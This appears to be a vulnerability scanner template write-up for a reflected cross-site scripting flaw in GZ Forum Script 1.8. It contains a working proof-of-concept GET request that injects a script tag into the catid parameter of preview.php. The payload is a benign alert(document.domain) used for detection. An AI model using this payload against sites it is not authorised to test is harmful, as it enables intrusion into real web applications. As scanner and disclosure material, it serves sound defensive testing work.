# Nuclei Template: GZ Forum Script 1.8 - Cross-Site Scripting
**Template ID:** gz-forum-script-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** Medium
**CWE:** CWE-80
**Source:** Nuclei Template (`gz-forum-script-xss.yaml`)

## Vulnerability Information & PoC

## Description
Cross-site scripting (XSS) is an attack in which an attacker injects malicious executable scripts into the code of a trusted application or website. Attackers often initiate an XSS attack by sending a malicious link to a user and enticing the user to click it.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/preview.php?controller=Load&action=index&catid=moztj%22%3E%3Cscript%3Ealert(document.domain)%3C%2fscript%3Ems3ea&down_up=a
```

## References
- https://www.exploit-db.com/exploits/51559
- https://gzscripts.com/gz-forum-script.html
